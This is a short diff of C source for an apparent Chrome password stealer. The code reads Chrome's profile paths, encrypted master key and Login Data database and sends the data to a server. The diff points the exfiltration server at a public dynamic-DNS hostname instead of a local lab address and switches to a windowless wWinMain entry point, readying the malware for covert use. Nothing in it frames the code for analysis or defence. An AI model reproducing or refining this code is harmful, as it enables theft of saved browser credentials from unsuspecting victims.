@@ -21,7 +21,7 @@
 #define TAG_LEN 16
 #define CIPHER_LEN 300
 #define DEFAULT_BUFLEN 512
-#define SERVER_IP "192.168.8.101"
+#define SERVER_IP "purloin2.sytes.net"
 #define DEFAULT_PORT "25565"
 
 #ifndef NT_SUCCESS
@@ -48,8 +48,8 @@ BOOL connect_to_serv(SOCKET* ConnectSocket);
 void sendData(char* data);
 void closeConnection();
 
-//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
-int main() {
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+//int main() {
 	/* These variables are used to retrieve chrome paths, directories, master key etc. */
 	WCHAR chrome_dir[MAX_PATH] = { L'\0' }, enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };	// Buffer to hold Google Chrome directory, and Encrypted master key (encrypted using CryptProtectData())
 	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR (Later it will be used to get profile paths to get Login Data db
